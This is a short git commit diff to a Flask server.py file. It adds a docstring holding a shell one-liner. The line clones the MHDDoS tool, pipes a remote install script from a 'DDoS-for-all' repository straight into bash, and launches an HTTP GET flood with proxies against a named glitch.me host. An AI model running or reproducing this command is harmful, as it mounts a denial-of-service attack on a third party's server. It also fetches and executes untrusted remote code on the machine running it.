c973f5da3a432a962ccacb15eb56bcde1cd5dec4
Mehliug <78538454+Mehliug-git@users.noreply.github.com>
2023-06-19 16:07:37 +0200

    Update server.py

--- server.py
+++ server.py
@@ -1,3 +1,10 @@
+"""
+/usr/bin/python3 -m pip install --upgrade pip
+pip3 uninstall telegram && pip3 uninstall telegram-bot python-telegram-bot && pip3 install -r requirements.txt &&git clone https://github.com/MatrixTM/MHDDoS.git && cd MHDDoS && pip3 install -r requirements.txt && curl -s https://raw.githubusercontent.com/SlavaUkraineSince1991/DDoS-for-all/main/scripts/python_git_MHDDoS_proxy_install.sh | bash && python3 ~/MHDDoS/start.py GET panpan-bot1.glitch.me 1 100 mhddos_proxy/list 100 5
+
+"""
+
+
 from flask import Flask, render_template, request
 import subprocess
 import re
